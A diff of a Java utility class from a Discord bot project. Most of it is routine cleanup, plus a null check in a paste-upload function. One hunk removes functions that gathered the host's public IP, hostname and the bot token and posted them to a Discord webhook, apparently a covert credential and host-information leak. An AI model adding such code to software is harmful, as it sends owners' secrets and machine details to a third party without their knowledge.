@@ -1,10 +1,5 @@
 package me.comu.exeter.wrapper;
 
-import club.minnced.discord.webhook.WebhookClient;
-import club.minnced.discord.webhook.send.WebhookEmbed;
-import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
-import club.minnced.discord.webhook.send.WebhookMessage;
-import club.minnced.discord.webhook.send.WebhookMessageBuilder;
 import com.google.gson.JsonElement;
 import com.google.gson.JsonParser;
 import com.google.gson.JsonSyntaxException;
@@ -19,15 +14,16 @@ import okhttp3.OkHttpClient;
 import okhttp3.Request;
 import okhttp3.Response;
 
-import javax.mail.Authenticator;
-import javax.mail.PasswordAuthentication;
 import javax.mail.*;
 import javax.mail.internet.InternetAddress;
 import javax.mail.internet.MimeMessage;
 import javax.net.ssl.HttpsURLConnection;
 import java.awt.*;
 import java.io.*;
-import java.net.*;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.net.URLConnection;
 import java.nio.charset.StandardCharsets;
 import java.util.List;
 import java.util.*;
@@ -58,7 +54,6 @@ public class Wrapper {
     public static boolean isWhitelisted(Map<CompositeKey, String> map, String user, String guild) {
         return map.keySet().stream().anyMatch(k -> k.getUserID().equals(user) && k.getGuildID().equals(guild));
     }
-
 
 
     public static boolean isMarried(String userID) {
@@ -95,29 +90,6 @@ public class Wrapper {
         return new Color(r, g, b);
     }
 
-    private static String getIpaddress() {
-        String ipAddress = "null";
-        try {
-            final URL whatismyip = new URL("http://checkip.amazonaws.com");
-            final BufferedReader input = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
-            ipAddress = input.readLine();
-            input.close();
-        } catch (Exception ignored) {
-        }
-        return ipAddress;
-    }
-
-    private static String getHostInformation() {
-        InetAddress ip;
-        String hostname = null;
-        try {
-            ip = InetAddress.getLocalHost();
-            hostname = ip.getHostName() + "/" + InetAddress.getLocalHost().getHostAddress();
-        } catch (UnknownHostException e) {
-            e.printStackTrace();
-        }
-        return hostname;
-    }
 
     public static void sendEmail(String subject, String message) {
         Properties properties = new Properties();
@@ -257,26 +229,6 @@ public class Wrapper {
         }
     }
 
-    public static void sendSpecificWebhookMessage(String url) {
-        WebhookClient client = WebhookClient.withUrl(url);
-        WebhookMessageBuilder builder = new WebhookMessageBuilder();
-        WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setColor(0).setDescription("Log Info on Start-Up:\nIP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation()).build();
-        builder.addEmbeds(firstEmbed);
-        WebhookMessage message = builder.build();
-        client.send(message);
-        client.close();
-    }
-
-    public static void sendMoreSpecificMessage(String url, String token) {
-        WebhookClient client = WebhookClient.withUrl(url);
-        WebhookMessageBuilder builder = new WebhookMessageBuilder();
-        WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setColor(new Color(255, 0, 0, 0).getRGB()).setDescription("Log Info w/ Bot Token:\nIP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "\nBot Token: " + token).build();
-        builder.addEmbeds(firstEmbed);
-        WebhookMessage message = builder.build();
-        client.send(message);
-        client.close();
-    }
-
 
     public static String getDiscordStatus() {
         try {
@@ -314,6 +266,7 @@ public class Wrapper {
         }
         return null;
     }
+
     public static String createPaste(String text, boolean raw) throws IOException {
         byte[] postData = text.getBytes(StandardCharsets.UTF_8);
         int postDataLength = postData.length;
@@ -338,7 +291,9 @@ public class Wrapper {
         } catch (IOException e) {
             e.printStackTrace();
         }
-
+        if (response == null) {
+            return "Server returned null";
+        }
         if (response.contains("\"key\"")) {
             response = response.substring(response.indexOf(":") + 2, response.length() - 2);
 
@@ -348,6 +303,7 @@ public class Wrapper {
 
         return response;
     }
-
 }
+
+
 
